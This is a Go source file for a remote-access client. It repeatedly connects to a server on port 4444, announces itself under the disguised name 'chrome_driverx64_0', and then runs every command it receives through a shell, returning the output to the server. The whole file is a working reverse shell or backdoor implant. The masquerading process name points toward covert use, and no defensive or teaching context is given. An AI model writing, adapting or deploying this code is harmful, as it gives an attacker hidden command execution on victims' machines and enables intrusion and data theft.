// client.go

package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type Client struct {
	Name       string
	ServerIP   string
	Port       int
	Connection net.Conn
	DataPath   string
	System     string
}

func NewClient(name, serverIP string, port int) *Client {
	return &Client{
		Name:     name,
		ServerIP: serverIP,
		Port:     port,
		DataPath: "data.txt",
		System:   runtime.GOOS,
	}
}

func (c *Client) Send(data string) {
	_, err := c.Connection.Write([]byte(data + "\n"))
	if err != nil {
		fmt.Println("Error sending data to the server:", err)
	}
}

func (c *Client) Connect() {
	for {
		c.ConnectToServer()
		if c.Connection != nil {
			c.Send(c.Name)
			break
		}
		time.Sleep(1 * time.Second)
	}
}

func (c *Client) ConnectToServer() {
	address := fmt.Sprintf("%s:%d", c.ServerIP, c.Port)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		c.Connection = nil
		return
	}
	c.Connection = conn
}

func (c *Client) HandleCommands() {
	for {
		command, err := bufio.NewReader(c.Connection).ReadString('\n')
		if err != nil {
			fmt.Println("Error reading command:", err)
			return
		}

		command = strings.TrimSuffix(command, "\n")

		if strings.HasPrefix(command, "cd ") {
			newDir := strings.TrimSpace(strings.TrimPrefix(command, "cd "))
			err := os.Chdir(newDir)
			if err != nil {
				fmt.Fprintln(c.Connection, "Error changing directory:", err)
			} else {
				fmt.Fprintln(c.Connection, "Changed directory to:", newDir)
			}
			fmt.Fprintln(c.Connection, "END_OF_RESPONSE")
		} else {
			cmd := exec.Command("sh", "-c", command)
			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Fprintln(c.Connection, "Error executing command:", err)
			} else {
				outputLines := strings.Split(string(output), "\n")
				for _, line := range outputLines {
					fmt.Fprintln(c.Connection, line)
				}
				fmt.Fprintln(c.Connection, "END_OF_RESPONSE")
			}
		}
	}
}

func main() {
	name := "chrome_driverx64_0"
	serverIP := "127.0.0.1"
	port := 4444

	client := NewClient(name, serverIP, port)
	client.Connect()

	for {
		go client.HandleCommands()
		time.Sleep(1 * time.Second)
	}
}
